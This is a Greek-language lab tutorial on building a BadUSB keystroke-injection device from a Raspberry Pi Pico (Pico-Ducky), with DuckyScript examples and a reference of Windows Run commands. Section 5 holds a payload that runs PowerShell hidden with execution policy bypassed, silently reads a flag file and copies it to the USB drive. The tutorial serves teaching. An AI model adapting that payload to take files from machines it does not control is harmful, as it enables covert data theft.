# Εργαστήριο «USB BadUSB» με Pico‑Ducky

> Σε αυτό το εργαστήριο θα μετατρέψεις ένα Raspberry Pi Pico σε "USB πληκτρολόγιο – χακερ" (Pico‑Ducky). Θα γράψεις δικά σου payloads σε DuckyScript και θα τα δοκιμάσεις σε εικονικό ή κανονικό Windows 10 PC.

---

## 1. Τι θα κάνουμε σε 5 βήματα

1. **Φλασάρουμε** το firmware pico‑ducky στο Pico.
2. **Φτιάχνουμε** το πρώτο payload (`payload.dd`) που ανοίγει Notepad και γράφει μήνυμα.
3. **Βελτιώνουμε**: προσθέτουμε καθυστερήσεις, shortcuts και αποθήκευση αρχείου.
4. **Payload PowerShell**: διαβάζει `flag.txt` και το αντιγράφει σε USB.
5. **Challenge**: Σχεδιάζεις δικό σου σενάριο.

---

## 2. Flash του Pico‑Ducky (μία φορά)

| Βήμα   | Τι κάνεις                                                                                   |
| ------ | ------------------------------------------------------------------------------------------- |
| **1.** | Κρατάς πατημένο **BOOTSEL** και βάζεις USB → εμφανίζεται δίσκος **RPI‑RP2**.                |
| **2.** | Σύρεις του zip φακέλου στον δίσκο.                                                           |
| **3.** | Σε 2 sec εμφανίζεται νέος δίσκος **CIRCUITPY**· μέσα βλέπεις `code.py`, `payload.dd` κ.ά.   |

> ⚠️ Αν δεν δεις το CIRCUITPY: άλλαξε καλώδιο (USB Data), επανέλαβε BOOTSEL.

---

## 3. Το πρώτο σου payload

Δημιούργησε ή άνοιξε το αρχείο **`payload.dd`** στη ρίζα του CIRCUITPY· βάλε:

```duckyscript
REM Notepad demo
DEFAULT_DELAY 300
GUI r
STRING notepad
ENTER
DELAY 600
STRING Hello ROBOTONIO!
ENTER
```

1. "Εject" τον δίσκο – βγάλε & ξαναβάλ’ το Pico **χωρίς BOOTSEL**.
2. Το Notepad ανοίγει και τυπώνει το μήνυμα.

### Γρήγορα tweaks

* **Πιο αργό PC;** αύξησε τα `DELAY` (ms).
* **Greek layout;** βάλε `ALT SHIFT` πριν το `STRING notepad`.

---

## 4. Αποθήκευση αρχείου από το Notepad

```duckyscript
REM Type & save note on Desktop
DEFAULT_DELAY 250
GUI r
STRING notepad
ENTER
DELAY 700
STRING Hi! Saved from Pico‑Ducky ✌
CTRL s
DELAY 500
STRING %USERPROFILE%\Desktop\note.txt
ENTER
DELAY 800
ALT F4
```

---

## 5. PowerShell payload – Αντιγραφή flag σε USB

```duckyscript
REM Read flag & copy σε CIRCUITPY
DEFAULT_DELAY 250
GUI r
STRING powershell -NoP -W Hidden -Exec Bypass -C "`
 $f='C:\flag.txt';`
 $p=(Get-CimInstance Win32_LogicalDisk | `
     Where {$_.VolumeName -eq 'CIRCUITPY'} | `
     select -First 1 -Expand DeviceID).Substring(0,1);`
 if($p){Copy-Item $f ($p+':\\flag.txt') -Force}"
ENTER
```

*Το script τρέχει κρυφά, διαβάζει το* `C:\flag.txt` *και το αντιγράφει στο CIRCUITPY.*

---

## 6. Κοινές εντολές DuckyScript

| Κατηγορία         | Εντολή / Συντόμευση           | Παράδειγμα Ducky    | Τι κάνει                             |
| ----------------- | ----------------------------- | ------------------- | ------------------------------------ |
| **Πληκτρολόγηση** | `STRING <text>`               | `STRING Hello!`     | Πληκτρολογεί το κείμενο.             |
|                   | `ENTER`                       | `ENTER`             | Πατά Enter.                          |
|                   | `TAB`                         | `TAB`               | Επόμενο πεδίο.                       |
|                   | `BACKSPACE`                   | `BACKSPACE`         | Διαγράφει χαρακτήρα.                 |
|                   | `ESCAPE`                      | `ESCAPE`            | Κλείσιμο/Cancel.                     |
| **Συνδυασμοί**    | `CTRL <key>`                  | `CTRL s`            | Ctrl + S κ.λπ.                       |
|                   | `ALT <key>`                   | `ALT F4`            | Κλείσιμο παραθύρου.                  |
|                   | `SHIFT <key>`                 | `SHIFT TAB`         | Αντίστροφο Tab.                      |
|                   | `GUI <key>`                   | `GUI r`             | Win + R (Run).                       |
|                   | `MENU`                        | `MENU`              | Δεξί‑κλικ (Context menu).            |
| **Βελάκια**       | `UP`, `DOWN`, `LEFT`, `RIGHT` | `DOWNARROW`         | Μετακίνηση.                          |
| **Καθυστέρηση**   | `DELAY n`                     | `DELAY 500`         | Αναμονή *n* ms μετά τη γραμμή.       |
|                   | `DEFAULT_DELAY n`             | `DEFAULT_DELAY 250` | Αυτόματο delay για επόμενες εντολές. |
| **Σχόλιο**        | `REM ...`                     | `REM Demo start`    | Γραμμή σχολίου.                      |

> **Tip:** Χρησιμοποιείς `DEFAULT_DELAY 250` για «ομαλό» script και μεγαλύτερα `DELAY` στις βαριές εντολές (άνοιγμα εφαρμογής, Save As).

---

## 7. Παραδείγματα σύνθετων κινήσεων

```duckyscript
# Αποθήκευση σημείωσης στο Desktop
DEFAULT_DELAY 250
GUI r
STRING notepad
ENTER
DELAY 700
STRING Quick note from Pico‑Ducky 🦆
CTRL s
DELAY 500
STRING %USERPROFILE%\Desktop\note.txt
ENTER
ALT F4
```

---

## 8. Win + R (“Run”) – Σύντομες εφαρμογές

| Εφαρμογή            | Εντολή Run                | Περιγραφή               |
| ------------------- | ------------------------- | ----------------------- |
| **Notepad**         | `notepad`                 | Απλός editor κειμένου   |
| **Paint**           | `mspaint`                 | MS Paint                |
| **Calculator**      | `calc`                    | Υπολογιστής Windows     |
| **Chrome**          | `chrome` ή `chrome <url>` | Εκκίνηση Chrome         |
| **Edge**            | `msedge`                  | Microsoft Edge          |
| **File Explorer**   | `explorer`                | Παράθυρο φακέλων        |
| **Command Prompt**  | `cmd`                     | `cmd.exe` κονσόλα       |
| **PowerShell**      | `powershell`              | PowerShell χωρίς admin  |
| **Task Manager**    | `taskmgr`                 | Διαχειριστής εργασιών   |
| **Registry Editor** | `regedit`                 | Μητρώο Windows          |
| **Services**        | `services.msc`            | Κονσόλα υπηρεσιών       |
| **Device Manager**  | `devmgmt.msc`             | Συσκευές HW             |
| **System Info**     | `msinfo32`                | Λεπτομέρειες συστήματος |
| **Control Panel**   | `control`                 | Κλασικό πίνακας ελέγχου |
| **Windows Version** | `winver`                  | Έκδοση λειτουργικού     |
| **DirectX Diag**    | `dxdiag`                  | Διάγνωση DirectX        |

Χρησιμοποίησε τα παραπάνω για γρήγορα mini‑payloads:

* άνοιξε `calc`, πληκτρολόγησε `123*456` και πάτησε Enter·
* εκκίνησε `mspaint`, σχεδίασε smiley (με κινήσεις mouse)·
* τρέξε `winver` και πάρε screenshot (ALT PRTSC).
